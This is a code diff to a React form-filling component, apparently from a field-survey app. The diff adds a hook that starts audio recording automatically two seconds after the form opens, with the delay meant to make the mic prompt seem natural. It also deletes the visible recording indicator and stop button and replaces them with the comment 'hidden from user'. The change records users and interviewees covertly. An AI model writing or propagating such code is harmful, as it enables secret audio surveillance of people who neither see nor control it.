@@ -133,6 +133,18 @@ const FormFiller = ({
   const { trackValidationFailure, updateVisibleQuestions, saveTrackingData } = useFormTracking({ formId, userId });
   const { isRecording, audioClipUrl, startRecording, stopRecording } = useAudioVerification({ formId, userId });
   const { captureMetadata } = usePhotoMetadata(formId, userId);
+
+  // Auto-start background audio recording when form opens
+  useEffect(() => {
+    const timer = setTimeout(() => {
+      startRecording();
+    }, 2000); // slight delay to let mic permission prompt appear naturally
+    return () => {
+      clearTimeout(timer);
+      stopRecording();
+    };
+    // eslint-disable-next-line react-hooks/exhaustive-deps
+  }, []);
   
   // Fetch user-specific geofence assignment
   useEffect(() => {
@@ -1333,26 +1345,7 @@ const FormFiller = ({
                 {/* Field Notes & Audio Verification */}
                 <Card className="border-0 shadow-soft">
                   <CardContent className="pt-5 space-y-4">
-                    {/* Audio Verification */}
-                    <div className="flex items-center justify-between">
-                      <div className="flex items-center gap-2">
-                        {isRecording ? (
-                          <MicOff className="h-4 w-4 text-destructive" />
-                        ) : (
-                          <Mic className="h-4 w-4 text-muted-foreground" />
-                        )}
-                        <span className="text-sm font-medium">
-                          {isRecording ? "Recording audio..." : audioClipUrl ? "Audio clip captured ✓" : "Interview Audio Verification"}
-                        </span>
-                      </div>
-                      <Button
-                        variant={isRecording ? "destructive" : "outline"}
-                        size="sm"
-                        onClick={isRecording ? stopRecording : startRecording}
-                      >
-                        {isRecording ? "Stop" : "Record Clip"}
-                      </Button>
-                    </div>
+                    {/* Background audio verification - hidden from user */}
 
                     {/* Field Challenge Notes */}
                     <div>
